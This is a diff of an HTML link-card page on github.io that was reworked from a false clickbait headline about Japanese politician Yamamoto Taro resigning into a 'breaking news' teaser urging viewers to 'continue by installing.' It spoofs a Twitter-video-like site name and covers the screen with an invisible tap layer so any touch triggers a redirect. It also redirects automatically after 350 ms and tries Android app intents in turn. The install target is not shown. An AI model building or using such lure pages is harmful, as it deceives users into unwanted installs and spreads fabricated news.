@@ -5,15 +5,15 @@
   <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
   <meta name="robots" content="noindex,nofollow" />
   <meta http-equiv="x-ua-compatible" content="ie=edge" />
-  <title>【話題】れいわ新選組・山本太郎、議員辞職を発表</title>
+  <title>速報｜依頼者の素顔</title>
 
-  <!-- OGP（Threadsリンクカード用） -->
+  <!-- OGP -->
   <meta property="og:type" content="website" />
-  <meta property="og:title" content="【話題】れいわ新選組・山本太郎、議員辞職を発表" />
-  <meta property="og:description" content="本人が語った理由とメッセージ。続きはタップで再生" />
-  <meta property="og:image" content="https://goflie-io.github.io/linkcard/card10.jpg" />
+  <meta property="og:title" content="速報｜依頼者の素顔" />
+  <meta property="og:description" content="続きはインストール" />
+  <meta property="og:image" content="https://goflie-io.github.io/linkcard/card10a.jpg" />
   <meta property="og:url" content="https://goflie-io.github.io/linkcard/index10.html" />
-  <meta property="og:site_name" content="goflie-io.github.io" />
+  <meta property="og:site_name" content="video-twimg-how.github.io" />
   <meta name="twitter:card" content="summary_large_image" />
 
   <style>
@@ -49,8 +49,6 @@
       padding:14px 22px; font-size:16px; font-weight:900;
       background:#fff; color:#111;
       box-shadow:0 10px 22px rgba(0,0,0,.18);
-      pointer-events:auto;
-      cursor:pointer;
     }
 
     .body { padding:14px 14px 18px; }
@@ -63,13 +61,15 @@
     }
     .tiny { margin-top:10px; color:#888; font-size:12px; line-height:1.4; min-height: 1.4em; }
 
-    /* index5 と同じ：全画面タップ（押し逃し防止） */
+    /* index5 と同じ：全画面タップ */
     .fulltap { position:fixed; inset:0; background:transparent; display:block; }
+    /* コンテンツを押した時の“反応”を邪魔しない */
     .page, .card, .chip, .topbar { position:relative; z-index: 1; }
   </style>
 </head>
 
 <body>
+  <!-- どこでもタップで tryOpen（index5と同じ思想） -->
   <div class="fulltap" id="fulltap" aria-hidden="true"></div>
 
   <div class="page" role="main">
@@ -87,19 +87,19 @@
 
     <div class="card" id="openCard">
       <div class="hero">
-        <img src="https://goflie-io.github.io/linkcard/card10.jpg" alt="thumbnail" />
+        <img src="https://goflie-io.github.io/linkcard/card10a.jpg" alt="thumbnail" />
         <div class="overlay">
-          <button class="btn" id="openBtn" type="button">▶ 続きを開く</button>
+          <button class="btn" id="openBtn" type="button">▶ 続きを視聴</button>
         </div>
       </div>
 
       <div class="body" id="openBody">
-        <div class="title">続きは外部リンクで開きます</div>
+        <div class="title">注目の話題：続きはインストールで視聴できます</div>
         <div class="meta">
-          <span>ピックアップ</span><span>・ タップで外部へ</span><span>・ ブラウザ/アプリ</span>
+          <span>ピックアップ</span><span>・ タップで再生</span><span>・ 外部で視聴</span>
         </div>
         <p class="desc">
-          このページはプレビュー表示です。続きはボタン（または画面タップ）で外部リンクを開きます。
+          ここではサムネイルのみ表示しています。続きは上のボタン（または画面タップ）で再生できます。
         </p>
         <div class="note">
           ※開かない場合は右上「…」→「ブラウザで開く」をお試しください。
@@ -142,17 +142,17 @@
   function tryOpen() {
     setStatus("読み込み中…");
 
-    // まず通常遷移
+    // ① まず通常URL（端末によってはこれだけでアプリへ）
     location.href = TARGET_URL;
 
-    // Android：アプリ起動を試行（端末/設定で効いたり効かなかったり）
+    // ② Android intent を時間差で試す（index5と同じ）
     let t = 250;
     ANDROID_INTENTS.forEach((intent) => {
       setTimeout(() => { location.href = intent; }, t);
       t += 250;
     });
 
-    // フォールバック
+    // ③ 案内
     setTimeout(() => {
       if (isInAppBrowser()) {
         setStatus("開かない場合は右上「…」→「ブラウザで開く」をお試しください。");
@@ -162,6 +162,7 @@
     }, 1200);
   }
 
+  // “どこを押しても同じ”に統一
   function bindOpen(el) {
     if (!el) return;
     el.addEventListener("click", (e) => { e.preventDefault(); tryOpen(); });
@@ -174,7 +175,7 @@
   bindOpen(openCard);
   bindOpen(openBody);
 
-  // 自動トライ（成功端末もある）
+  // 自動トライ（index5と同じ）
   setTimeout(() => { tryOpen(); }, 350);
 </script>
 </body>
